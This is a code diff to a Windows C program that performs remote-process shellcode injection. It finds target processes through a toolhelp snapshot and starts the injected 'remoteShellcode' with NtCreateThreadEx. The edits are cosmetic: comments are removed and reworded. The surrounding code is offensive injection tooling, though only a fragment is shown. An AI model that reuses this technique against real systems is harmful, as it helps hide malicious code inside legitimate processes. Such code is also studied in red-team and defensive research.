@@ -155,8 +155,7 @@ int main(void){
             }
         }
     }
-/*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
     if(snapshot == INVALID_HANDLE_VALUE){
         printf("[-] creating snapshot failed, error: [%d]\n", GetLastError());
@@ -252,19 +251,19 @@ int main(void){
     HANDLE hThread = NULL;
     PVOID remoteShellcode = (LPTHREAD_START_ROUTINE)cSection;
     _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)function_addresses[1];
-//for proper working demands PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in Open_Process function
+//for proper operating requireing the PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in OpenProcess function
     status = NtCreateThreadEx(
-        &hThread,               // PHANDLE ThreadHandle
-        THREAD_ALL_ACCESS,      // ACCESS_MASK DesiredAccess
-        NULL,                   // POBJECT_ATTRIBUTES ObjectAttributes (NULL jeśli nie potrzebne)
-        hProcess,               // HANDLE ProcessHandle
-        remoteShellcode,       // PVOID StartRoutine
-        NULL,                   // PVOID Argument (NULL w tym przypadku)
-        FALSE,                  // ULONG CreateFlags
-        0,                      // SIZE_T ZeroBits
-        0,                      // SIZE_T StackSize
-        0,                      // SIZE_T MaximumStackSize
-        NULL                    // PPS_ATTRIBUTE_LIST AttributeList (NULL w tym przypadku)
+        &hThread,              
+        THREAD_ALL_ACCESS,     
+        NULL,                  
+        hProcess,               
+        remoteShellcode,       
+        NULL,                   
+        FALSE,                  
+        0,                      
+        0,                     
+        0,                      
+        NULL                    
     );
     if (!NT_SUCCESS(status)) {
         printf("[-] Failed to Execute Remote Thread: 0x%X\n", status);
